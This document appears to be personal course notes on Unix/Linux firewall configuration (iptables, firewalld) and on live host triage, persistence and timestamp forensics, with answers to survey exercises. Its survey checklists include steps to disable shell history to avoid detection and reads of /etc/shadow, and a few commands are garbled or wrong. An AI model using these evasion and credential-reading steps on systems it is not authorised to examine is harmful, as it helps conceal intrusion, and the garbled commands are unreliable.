sudo iptables -P INPUT ACCEPT &&
sudo iptables -P OUTPUT ACCEPT &&
sudo iptables -P FORWARD ACCEPT
 
}

{ # Firewall practice

!!! MATCHING METHODOLOGY (parse iptables lines) !!!
- does rule's src address match our packet?
	- Does destination match?
	- Does it allow the dst/src ports?
	- does it allow the protocol?

# IOT MODIFY RULES - with line #
iptables -L --line-numbers 

# modify 
iptables -R <chain> <rulenum> <new rule def>

# insert  
sudo iptables -I INPUT <Number> <rule def> 

# delete 
sudo iptables -D INPUT <Number>


# check iptables rules on boot (persistent)
vim /etc/sysconfig/iptables
}

{ # firewalld / firewall-cmd (supports tab completion) // remember to check underlying iptables -L -n -v
# zone order. If packet matches zone:
source address -> incoming interface -> default zone 

# follow targets (if math criteria above, leads to new chains). often chains will run through subchains log, deny, allow in order 

# display all rules. note PUBLIC zone = default 
firewall-cmd --list-all-zones 
# remember to display underlying iptables rules!
iptables -L -n -v 
ip6tables -L -n -v 

# config files 
ls -l /usr/lib/firewalld  # default config 
ls -l /etc/firewalld/ # user/custom configs rules 
	- if no .xml files, may be no user defined 
vim /etc/firewalld/firewalld.conf 
/etc/firewalld/services/*.xml # allowed services 


# custom user defined zones 
ls -l /etc/fierwalld/services 
ls -l /etc/firewalld/zones 

# to set a permanent config 
firewall-cmd [rule] --permanent 

# reload permanent config into running config (0 downtime/interruptions) --- but REPLACE running config with perm. config
firewall-cmd --reload 

/// EXAMPELS \\\ 
# set default zone (to dmz)
firewall-cmd --set-default-zone=dmz 
# route traffic from /24 network to the internal zone 
firewall-cmd --permanent --zone=internal --add-source=192.168.1.0/24 
# allow mySQL traffic to internal zone 
firewall-cmd --permanent --zone=internal --add-service=mysql 

{ # Common optoins  
	1 --get-default-zone
	2 --set-default-zone=<ZONE>
	3 --get-zones
	4 --get-active-zones
	5 --add-source=<CIDR> [--zone=<ZONE>]
	6 --remove-source=<CIDR> [--zone=<ZONE>]
	7 --add-interface=<INTERFACE> [--zone=<ZONE>]
	8 --change-interface=<INTERFACE> [--zone=<ZONE>]
	9 --list-all [--zone=<ZONE>]
	10 --list-all-zones
	11 --add-service=<SERVICE> [--zone=<ZONE>]
	12 --add-port=<PORT/PROTOCOL> [--zone=<ZONE>]
	13 --remove-service=<SERVICE>
	14 --remove-port=<PORT/PROTOCOL> [--zone=<ZONE>]
	15 --reload

	1 Query the current default zone.
	2 Set the default zone (In both runtime and permanent config)
	3 List all zones.
	4 List all zones currently in use. (Have an interface or source tied to them)
	5 Route all incoming traffic from the IP or network to the specified zone. Use default zone if not specified.
	6 Remove the source rule from a zone.
	7 Route all traffic from <INTERFACE> to the specified zone.
	8 Apply the interface to a different zone.
	9 List all configured interfaces, sources, services, and ports for <ZONE>.
	10 Retrieve all information for all zones.
	11 Allow incoming traffic to the port associated with <SERVICE>.
	12 Allow incoming traffic to the <PORT/PROTOCOL>.
	13 Remove <SERVICE> from the allowed list in a zone.
	14 Remove allowed port from a zone
	15 Reload the permanent config into the runtime config. This will keep state information and will not interrupt established connections.Explanationfirewall-cmd Options--add-masqueradeEnables masquerade or NAT for a zone
}


{ # rich rule usage 
	firewall-cmd --add-rich-rule=’rule protocol value=”ah” accept’ # Enable IPv4 connections for the ah protocol
	firewall-cmd --add-rich-rule=’rule service name=”ftp” log audit accept’ #Allow IPv4 ftp connection and log them using audit
	firewall-cmd –add-rich-rule=’rule family=”ipv4” source address=”192.168.0.0/24” service name=”tftp” log prefix=”tftp” level=”info” limit value=”1/m” accept’ #Allow connection from 192.168.0.0/24 for the tftp service and log 1 per minute using syslog

}

# Direct Rule syntax 
[--permanent] --direct --add-rule ipv4 <table> <chain> <priority> <args> …

# List direct rules 
firewall-cmd --direct --get-all-rules

# blocking outgoing traffic (with direct cmd) example / persistent 
firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -p tcp -m tcp --dport=80 -j ACCEPT
firewall-cmd --permanent --direct --add-rule ipv4 filter OUTPUT 1 -j DROP

#  block outgoing tcp traffic from being sent to the host with IP address 192.168.7.125
firewall-cmd --direct --add-rule ipv4 filter OUTPUT 1 -p tcp -d 192.168.7.125 -j DROP
firewall-cmd --direct --remove-rule ipv4 filter OUTPUT 1 -p tcp -d 192.168.7.125 -j DROP

}

{ # snort / tripwire 
# view snort config/rules 
ls -al $RULE_PATH
	ls -al /etc/snort/rules 

vim $RULE_PATH/snort.conf 

}

}

}

{ ``` 3. UNIX Triage and Interrogation ```

{ ``` 3.1 Survey Methodology ``` 

{ # general notes 
1. use TRUSTED tools; upload your own set / use full paths 
	- should ideally be statically linked (no DLLs)
	1.5. if kernel rootkit & syscalls are compromised, can't trust tools. back off (offline analysis)
2. footprint reduction
	- fewer commands: less packets on wire / bandwidth 
					less chance of logging (detection) 
	- use personal cmds list
		can remove typos, forgotton options, 
	- eliminate trail of actions
		unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
		script surveyTranscript.txt 
3. run most labor intensive commands EARLY in forensic analysis process 
4. Triage (candidate list), prosecute
5. Sus behavior <procs, conns, progs>
	- network conn host checks: ports 
	- unusual user running proc (shuld root be running this?)
	- unusual/expected parentage 
	- unusal procs/services making net conns 
	- the geography of the remote connection 
}

{ ``` TRIAGE: system chars, procs, network cons ```
# SYSTEM CHARACTERIZATION

date 
uname -a #  system version
w 
last 
uptime
psrinfo –v # (Solaris)
cat /proc/cpuinfo # (Linux) displays processor information
hostid # Provides Numeric host ID, often tied to license
modinfo –c # (Solaris)
lsmod # (Linux) Displays installed kernel modules
vmstat #Provides information about system memory
hostname 
ifconfig –a 
arp –an 
netstat –rn
ip route show (newer Linux)

# PROCESSES 
- Start from unexpected locations 
	/tmp? /home/user? anything outside /bin /sbin = worth extra scrutiny (pending system config)
- Start sooner than expected
	vs normal startups like mingetty, sshd, crond, etc. 
- Possess unusual options or arguments
- Possess unexpected ancestors/PPID
	- shell procs from abnormal parents e.g. httpd , sendmail
- Are run by unexpected users
	- should this proc be started by root? (many startup procs shouldnt). should it be started by user? 
		httpd/sendmail aren't ran by root 
- Exhibit strange or intentionally malformed names
	- "sshd " vs sshd, /... vs /..

# NETWORK CONNECTIONS 
// LINUX
netstat -punta 
	procID, UDP, numeric, tcp, add.info (listening + non-listening sockets), 

// SOLARIS 
netstat -anP tcp 
	add. info, numeric PROTOCOL
netstat -anP udp  
lsof  # list open FDs/sockets, typically better for targeted searches via /proc. BUT always worth glancing at

# display open ports via PID basis  - list open sockets/ FDs
$ cd /proc; for p in 'find * -type d -prune'; do pfiles $p I grep port >> /tmp/ports Ens echo PID: $p >> It-mp/ports; done 
pfiles # list open FDs/sockets 

{ # PROC LIST TRIAGE 
# general 
- Risk to operation: Malware/backdoors/signs of compromise
	check: proclist, netsockets, useraccounts, logs 
			behavior: remote conns, monitors, outside primary purpose 
	process consider:
		- unusual: location, user (running or owner), start times (should be in boot? should not be in boot?), arguments, parent/childs, connections
		- unfamiliar process/ not stock on env, missing processes? 

# example 
- 1. sysem characterization. OS & common services/procs? What is its purpose i.e. server vs personal 
- 2. what  procs can provide remote access?
	rpc (portmapper), printserver (cupsd), mail server (sendmail), ssh server (sshd) 
	*vsftpd is running. not baseline for centOS / server. INVESTIGATE - add candidate 
- 3. sendmail running from /usr/bin/ (default for sendmail/most server procs = usr/sbin) 
- 4. why is sshd running most startup procs? could be an update/config change, OR malicious activity 
- 5. sendmail arguments are abnormal == nc
	- stands out from other sendmail procs
	- sendmail typically runs 1 process as root. UNIX, only root can open sockets on most common ports 
		- 2 many sendmail prosc on this system running as root 
6. unusual IDs (check out procs that have numeric user ID)
	- for users w/more than 8 chars 
7. the many sendmail children, parent is NOT from the good process. 
	*** backdoors/security vuln exploit shells: will NOT have a controlling terminal --- tty column = ? 
8. Look up all unfamiliar procs, quick verify  
9. missing known default procs? could be ROOTKIT filtering 
	example: many mingetty tty2-6. but nothing running on tty1 - no getty,shell,xserver 
10. bash PPID 1954 doesn't appear anywhere on proc list 
	- since no local logins, shell is using  pseudo (pty) terminal: could be ran from a hidden malicious daemon (e.g. telnet) 
}


}

{ # SUS Behavior checks 
// Additional host checks (sockets/remote conns)
- unusual/unexpected ports 
- unusual users associated w/processes & servers w open sockets 
- unusual/unexpected parentage 
- unusual proc/services making net conns 
- geography of established conns (e.g. 5 USA 1 Myanmar)

// Disk checks 
- /, /tmp, /home/users/*

// Final Checks
- userspace initialization files 
	/etc/inittab 
	rc.sysinit/local/rcX scripts 
		diff known sizes against known good examples 
- init scripts 
	- inserted malicious process started when legit service runs (via existing init script) // ran early in boot cycle --- early in proc list?
- sched tasks 
	- cron checks + at 
	for user in $(cut -f1 -d: /etc/passwd); do echo $user >> /tmp/crontabs; crontab -u $user -l >> /tmp/crontabs; sudo cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
	ls -al /var/spool/at  # at jobs 
	ls -la /etc/cron.*
- login scripts 
	- check root usr home, other users 
	- login,logout,etc.***


}

{ # ex1 perform live linux triage

# list all accounts with ability to login 
cat /etc/passwd | egrep -v "nologin" 
cat /etc/shadow #which have passwds?

# list routes; anything sus? If so, is it of interest?
	218.77.79.0/24 via 172.16.0.1 dev eth0 # google "whois 218.77.79.0/24" = internet block located in China
		^ not part of netmap

# view running services 
service --status-all
chkconfig --list
	# CONSIDER: what services typically bootd by default/ may want to be tampered 
		e.g. ip6tables, auditd, rsyslogd
			^ unfettered ipv6 access, restricted logs


}

{ ```  PROSECUTION ```
	# Executable characterisitcs 
	- open source research - googlefu 
	- where does it live on disk?
	- what is it doing? what FD it have open? Any network/UNIX domain sockets open? --- lsof/pfiles 
	- human readable strings? (strings)
	- man it, echo [file] | md5 --- virustotal 

	# Process network capabilities 
	- inititing any outbound conns?
	- listening locally?
	- any established connections? if so, what doing: exfil data, receiving instructions, etc.
	- any strings like "INET", "AF", "SOCK" - indicating networking syscalls? (strings / strace | egrep "INET|AF|SOCK"

	# Associated Files 
	- what else created/modified around same time as the executable e.g. files/dirs/configs 
	- is it creating or outputting files/logs to disk? (use my check time comm). 
		- configuration/C2 related files? 

	# Persistence method - crucial
	- does it start somewhere in user initialization (PID of proc can clue  where in boot config to search) 
	- it it a cron job?
	- start on user's login?
	- how does it start? what is parent proc? 
		- SysV / upstart/ SMF / systemd checks 
			/etc/init.d/* + /etc/rc * ///// chkconfig 

	# if firewall rules aren't in /etc/iptables/
		check /etc/sysconfig/iptables
}

}

{ ``` 3.12 Survey methodology extra ```

# survey list v1 { - timestamp major commands, connections - logging reference 
- consider: risk to operation? target's situational awareness?
- always: have i been noticed? is it safe to operate?

--------- init checks ---------
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
w; id; uname -a; date; date -u; pwd; ps -p $$
ip neigh
ip addr || ifconfig -a

hostname // ?
sestatus 

--------- procs ---------
ps -efT || ps -ef --sort start_time 
ps -elf || ps aux www
netstat -punta # do NOT use -p unless root --- otherwise may log w/selinux 
netstat -rn 
arp -v 
df -h # hard driev utilization 
df -i # inode info 

--------- system intended use + log activity --------- # inspect each 
ls -latrd /etc/cron*
ls -latr /var/spool/cron /var/spool/at  

--------- user dirs --------- # focus on histories 
ls -latr /root 
ls -latr /home
ls -latr /home/*
ls -latr /export/home # may be mounted user dirs 
ls -latr /export/home/*
less /root/.history 

--------- malware, config, binary checks --------- # (check for system command tampering)
ls -latr /tmp 
ls -latr / 
ls -latr /bin
ls -latr /sbin
ls -latr /usr/bin
ls -latr /usr/sbin
ls -latr /usr/local/bin
ls -latr /usr/local/sbin

--------- logging ---------
cat /etc/syslog.conf || cat /etc/rsyslog.conf 
ls -latr /var/log /var/log/audit 
ls -latr /var/adm # Solaris 

# last logged on users. use find/ grep to crossref 
last -i 

# parse messages 
egrep -v "kernel|dbus" /var/log/messages | tail -n 50 

}

# survey list v2 { - 
``` --------- TRIAGE --------- ``` 
--------- init checks ---------
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
w; id; uname -a; date; date -u; pwd; ps -p $$
cat /etc/*release*
ip addr || ifconfig -a
ip neigh

sestatus 
	cat /etc/selinux/semanage.conf

--------- procs / conns ---------
ps -elf || ps aux www
ps -efT || ps -ef --sort start_time 
ps -efH

netstat -punta # do NOT use -p unless root --- otherwise may log w/selinux 
netstat -rn 
arp -v 

--------- secondary checks ---------
last; lastlog
mount
df -h 
	df -i # inode info 
	
--------- boot services ---------
service --status-all
chkconfig --list
	systemctl list-unit-files --type=service --state=enabled

--------- system intended use + log activity --------- # inspect each 
ls -latrd /etc/cron*
for user in $(cut -f1 -d: /etc/passwd); do echo "###### $user crontab is:"; sudo cat /var/spool/cron/{crontabs/$user,$user} 2>/dev/null; done
ls -latr /var/spool/cron /var/spool/at  

--------- user dirs --------- # focus on histories 
ls -latr /root 
ls -latr /home
ls -latr /home/*
ls -latr /export/home # may be mounted user dirs 
ls -latr /export/home/*
less /root/.history 

--------- malware, config, binary checks --------- # (check for system command tampering)
ls -latr /tmp 
ls -latr / 
ls -latr /etc
ls -latr /bin/
ls -latr /sbin/
ls -latr /usr/bin/
ls -latr /usr/sbin/
ls -latr /usr/local/bin/
ls -latr /usr/local/sbin/

--------- logging ---------
ls -la /etc/*syslog*
cat /etc/syslog.conf || cat /etc/rsyslog.conf 
ls -latr /var/*log*/ /var/*acc* /var/account/* /var/log/audit 
ls -latr /var/adm # Solaris 

# last logged on users. use find/ grep to crossref 
last -i 

# parse messages 
egrep -v "kernel|dbus" /var/log/messages | tail -n 50 

cat ~/.bash_history 

========== if root ==========
su root 
unset HISTFILE HISTSIZE HISTFILESIZE PROMPT_COMMAND
w
last; lastb -20; lastlog
lsmod | grep ipt || cat /proc/modules | grep ipt
iptables -nv -L
ls -latr /var/log/*
#cat /var/log/* 
ls -latr /root
ls -latr /var/spool/cron | tail -n 1000 <files in /var/spool/cron/>
cat /etc/rsyslog.conf
cat /etc/rsyslog.d/*.conf
cat /etc/crontab
cat /root/.bash_history
cat /etc/passwd | grep -v "nologin"
cat /etc/shadow 
cat /etc/group
find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<duration since initial connection> -type f -print0 | xargs -0 sudo ls -latr 

``` --------- PROSECTUTE --------- ``` 
ls -latr /proc     #shows all processes with associated files
-maps: shows shared objects mapped to process memory
-exe: a copy or link to binary used to execute process
-cmdline: the command w/ args that started the proc
-cwd: the current working dir
-fd: show file descriptors in use by proc

strings <file | less   #print readable chars in a file
strings <file> | egrep -i "INET|AF|SOCK|BIND|BACKDOOR|ssh"
man <file> 	# if gook, def malware 
cat <file> | md5sum # Virustotal check 

#pull a binary from proc mem
file <file>   # gives file type and build info
ldd <file>   #lists dynamic libraries loaded by proc

# find log files 
lsof -Pnp <pid>
	pfiles -p # Solaris 
-P: dont resolve port numbers
-n: dont resolve hostnames
-p: selects based on PID

# system-find.prosecute - locate init scripts, crons, configs, hijack binares for /path/to/susp/proc
find / -type f ! -path "/proc/*" ! -path "/dev/*" ! -path "/boot/*" ! -path "/sys/*" ! -path "/selinux/*" -exec grep -l "/path/to/sus" {} \;

locate <string> 

``` MISC / FINDS ```{	 
# find modified files since -X time // good for writing/logging - sus procs & services 
sudo find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -<since mod> -type f -print0 | xargs -0 sudo ls -latr 

# find hidden files and dirs 
find / -type f -name ".*"
find / -type d -name ".*"

# look for mal user attempts 
grep "Failed password" /var/log/secure |cut -d ":" -f 4 |grep -v "invalid user" |awk '{print $6}' |sort -n |uniq 

# search between timestamps 
	find / -newermt "2016-08-14 22:53:04"  ! -newermt "2016-08-24 22:53:04"
	find / -newermt "2017-02-29" ! -newermt "2017-02-30"

{ Method Reference 
Triage:
- Start from weird location?
- Start sooner/later than expected? e.g. apache early or crond after user login 
- weird options/arguments? 
- unexpected ancestors/PPIDs?
- ran by funky users?
- strange/malformed name? 

Persistence:
- system startup (before basic.target / part of sysinit line of /etc/inittab) 
- userspace startup (multi/graphic target or SysV /etc/rc.d) 
- scheduled jobs (cron, anacron, atd)
- user login (login scripts)

Timestamps:
- what users are involved (last logins)
- how proc was put into system (install logs/history files)
- IP addresses associated w/activity or access vector- refernce log info (iptables logging, misc logs w timestamp)
}

}

}

# System characterization { 
#  system version
uname -a
w 
last 
uptime
# (Linux) displays processor information
cat /proc/cpuinfo 
	psrinfo –v # (Solaris) 
# Provides Numeric host ID, often tied to license
hostid
# (Linux) Displays installed kernel modules
lsmod 
modinfo –c # (Solaris)
#Provides information about system memory
vmstat 
hostname 
arp –an 
netstat –rn
ip route show (newer Linux)
}

# Triage {
# Procs 
ps -elf ww 
ps -elT 

# Network Conns 
netstat -auntp || ss -a && ss -lp

# File locs 
/bin, /sbin, /usr/bin, /usr/sbin
/usr/local/bin, /usr/local/sbin
/opt, /usr/share, /usr/lib
/media, /mnt, /boot
/tmp, /var, /hom
}

{ #Timestamps 

stat /tmp 
stat /tmp/file
ls -al /tmp # mtime , running ls (or any read of inode info) will (can) change the atime on read, but may not modify ctime if that's all that is udpated  
		- lighten burden on OS 
ls -lu # atime 
ls -lc # ctime 

timestamps - for finding related files & also correlating log events


--------- exercise ---------# 
1. get MAC for root dir 
ls -al /root 
ls -ual /root 
ls -cal /root 

for i in $(ls -al /root); do stat $i; done 

#preserve timestamps on copy
cp -p 


{ ``` RIVEN TIMESTAMP REFERENCE ```
How common commands change MACtimes for a directory (foo):

Action                                        atime  ctime mtime
creation (mkdir foo)                          X      X     X
directory move (my foo bar)                          X     X
file creation (touch foo/foo)                        X     X
file creation (dd if=/dev/zero of=foo/foo            X     X
count=1)
list directory (Is foo)                       X
change directory (cd foo)
file test (-f foo)
file move/rename (mv foo foo_mvd)                    X     X
permissions change (chmod/chown                      X
<some_perm> foo)
file copy (cp foo foo_cpd)                           X     X
copy from directory (cp org/foo new/foo)
file edit (vim foo)                                  X     X
file edit (emacs foo)                         X      X     X
file edit (nvi/nano foo)

How common commands change MACtimes for a file (f1):
Action                                        atime ctime mtime
creation (touch foo)                          X      X     X
creation (dd if=/dev/zero of=foo count=1)     X      X     X
rename (mv foo bar)
move                                                 X
permissions change (chmod <some_perm> foo)           X
copy (cp foo bar)                             X
copy overwrite (cp bar foo)                          X     X
append (cat >> foo)                                  X     X
overwrite (cat > foo)                                X     X
truncate (cp /dev/null foo)                          X     X
list file (Is foo)
edit (vim/emacs/xemacs/joe/jed foo)           X      X     X
edit (ed/nvi/vi (sun)/vi (obsd)/nano/pico foo)X1     X1    X1
1 — all times changed, but atime is slightly older than mtime and ctime

}


}





}

{ ``` 3.2 Survey (takeaway) ```  

{ # 1 Analyze a Solaris Survey 

#9. Identify mount points that have swap devices mounted on them 
df -k -l 
	swap	[mount point] 
	
#11. if remove file with 31 link counts, inode link count DECREMETNS  to 30 

#12. where would messages with facility=daemon and severity=warning be sent?
by default, syslog logs facility.severity+ 
	e.g. daemon.notice /var/adm/messages # warning > notice, so logged to /var/adm/messages

}

{ # 2 Performing live Solaris Survey 
#2. list all kernel modules 
modinfo # NOTE - if wanted to list the NUM of mods, would need to | UNIQ them --- recurrances appear 

#3. what accounts have interactive login?
cat /etc/passwd /etc/shadow 
- check for login shells AND passwords/account status (e.g. disabled) 

#9. Check recent login activity on machine 
last
last -f /var/adm/wtmpx.<suffix> # check recent logrotated files! 

#10. which /usr/sbin files/subdirs files have SUID set 
find /usr/sbin -perm /4000 -type -f 
	# for SGUID 
	find /usr/sbin -perm /2000 -type f 

#13. which dirs use the most file space?
du -sh <file or dir>

#14. how many associated inodes with file? hard links?
stat <file>
ls -li <file>
	# the number after perms is hard links. If 1 == no hard links 

#15. list only /usr/bin/dispuid and files referencing same file on disk 
 find / -inum 74653
 find / -samefile /usr/bin/dispuid
 
#16. Identify the fully qualified path to the executable running as devfsadmd.
if pfiles <PID> doesn't work 
	 ls -l /proc/<PID>/path/a.out
}

{ # 3 Analyze linux survey 1
# 1. find runlevel 
cat /etc/inittab 
who -r 
runlevel 

#5. what type of shell used to run Eclipse program?
if determine #!/bin/X , ls -al /bin/X = ensure NOT linked to something else .... 
or lsof -nP -p <PID> 

#6. list number of physical disks and partitions 
fdisk -l 
	// SDA = disk 
	// sda1,sda2 = partitions 
	// /dev/mapper/vg etc == logical partitions. dont count 

#14. List TCP ports listening and EXTERNALLY accessible 
netstat -punta 
	!!! iptables -L 
	

}

{ # 4 Analyze linux survey 2

#1. identify kernel version.
uname -a 

# 1.5 can determine hosts DOMAIN if has a top level e.g. abc.com in output 
	


#4. how long since last boot?
uptime 
w

}

{ # 5 Perform live *NIX survey 1 (Solaris / SMF ) 

#9. identify init system used by host. And current runelvel/target/milestone 
who -r 
svcs *milestone 

#10. how many services start on boot?
svcs | wc -l 
	subtract 1 (first line contains column headers....)

#11. view inetd controlled services / how many are enabled? 
inetadm 
inetadm | grep enabled 

#12. check if firewall enabled 
ps -ef | grep ipmon 
ls /etc/ipf/ipf.conf 
svcs -l ipfilter 

#13. list active rules 
ipfstat -io 

#19. is X logging? (e.g. firewall logging to a file?)
/etc/syslog.conf 
	local0.debug /var/log/ipflog # defines where ipfilter firewall logs 
pfiles <pid>


}

{ # 6 Perform live *NIX survey 2 (Debian / sysV ) 

# find OS version 
lsb_release -v // -a  # most in depth 
	cat /etc/*release*
	uname -a

# find ip address; how is it assigned?
cat /etc/network/interfaces 
	- shows static or dynamic 

# find filesystem types in use 
df -T

# what user had most logins during X day?
cat /var/log/wtmp && cat /var/log/wtmp.1 && etc. 

# is firewall generating logs? where?
- when packet hits LOG rule, - kern - facility is generated 
- check /etc/rsyslog.conf based on that 


}

{ # 7 Perform live *NIX survey 3 (CentOS / systemd)

#2. list all kernel modules. description for lockd kernel module?
lsmod 
modinfo lockd 

#4. where is swap partition located?
lsblk 
	lsblk -p # print device paths 
fdisk -l 
cat /etc/fstab

#9. What resource is this host configured to reference first for login information?
vim /etc/nsswitch.conf 
	view how logins are referenced 

#12. How many processes were started when the smb service was started on boot?
	ps -efH 
	tree 
systemctl status smb.service 

#15. Identify the systemd target units that the default target is dependent upon
systemctl list-dependencies multi-user.target 
	systemctl list-dependencies multi-user.target | grep target 

# misc - List systemd sockets (may be helpful if can't identify via netstat)
systemctl list-units -t socket

}

{ # 8 Perform live *NIX survey 4 ( Ubuntu / Upstart) 

#15. how many times will btmp rotate before it is removed?
cat /etc/logrotate.conf 
	rorate 4 # 4 backlogs until delete

#18. How many instances of Upstart-managed services are currently running?
initctl list | grep "running" | wc -l

#24. Taking current rules into consideration, select all elements of an iptables command that collectively create a new rule that will drop all HTTP traffic from IPv4 addresses outside this host's network while allowing the same traffic from within the network

iptables -I INPUT -s ! 10.8.25.64/28 -p tcp --dport 80 -j DROP 

!!!!!!!!!!!
# 10. How many users accounts have default shell of /bin/bash
getent passwd | grep /bin/bash | wc -l 
getent group

^^^!!! = ALWAYS CHECK! may as well but especially if LDAP/389 and ncsd is running!!! 

# 14. what day had most failed logins?
sudo lastb /var/log/btmp 
sudo lastb /var/log/btmp.1 

}

{ # 9 Perform live *NIX survey 5 ( CentOS / Upstart ) 



# 5. *from manually inspecting most symlinks in /bin e.g. /bin/read -> vi 
*from manually inspecting most symlinks in /bin e.g. /bin/read -> vi (most was /bin/vi)
/usr/bin/find / -maxdepth 3 -type l -ls

#6. How many blocks does the boot partition currently have? 
fdisk -l 
	# Blocks 
	//currently have = means used ? 

# 10. Identify the service(s) started when the command telinit 3 is executed by the user account root. Do not include any TTY-related services in your answer. 
- check current runlevel (inittab)
- what services start from 5 - 3? (could be none)
	
#11. Identify the directory containing files that define aliases for all users with an interactive BASH login.
/etc/bashrc

#13. Identify the RUID for the process with a PID of 15606. Your answer should consist ONLY of a numeric string.
- find proc UID then cat /etc/passwd 

#15. How was eth0 assigned the IP address 192.168.11.107? 
- find the config file 
	/etc/syconfig/network-scripts/ifcfg-eth0 
	/etc/network/interaces/etc
	
#16. How many threads are associated with the console-kit-daemon process? Your answer should consist ONLY of a numeric string
	top
	ps -eLf # NLWP (lightweight procs AKA threads?!)	
	ps -lT 
	# pstree - idk bout this one 
	
# 23. Where would failed attempts to sudo be logged? 
	- on CentOS - /var/log/secure = default 
	
#25. When was the current kernel update installed? Your answer should be in the form of MM/DD HH:MM (24 hour clock).
sysctl -a 
	kernel.version = 
	uname -a 
	rpm -qa --last | grep kernel 
	| grep kernel # find kernel parameters e.g. max PID 
cat /etc/sysctl.conf --- kernel.pid_max = X 
	kernel.pid_max

check installer log !!!
	yum.log  
	
#27. Assume the following packet is not part of an existing session or connection and there is no other relevant traffic reaching the host. What action(s) would occur when the host receives this packet:
iptables --- 
	tcp flags:!0x17/0x02 state NEW === drop traffic that are not new TCP SYN flags 
	Dropping any tcp packet that doesn't start a connection with a syn flag
}



}



}


